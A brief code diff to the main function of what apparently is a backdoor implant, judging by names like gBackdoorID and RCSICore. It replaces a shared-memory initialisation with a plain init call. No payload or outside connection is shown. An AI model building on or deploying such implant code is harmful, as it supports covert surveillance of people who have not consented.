@@ -23,10 +23,8 @@ int main (int argc, const char * argv[])
   
   // FIXED- fixing string binary patched
   gBackdoorID[14] = gBackdoorID[15] = 0;
-  
-  int shMemSize = SHMEM_COMMAND_MAX_SIZE;
-  
-  RCSICore *core = [[RCSICore alloc] initWithShMemorySize: shMemSize];
+    
+  RCSICore *core = [[RCSICore alloc] init];
 
   [core runMeh];
   
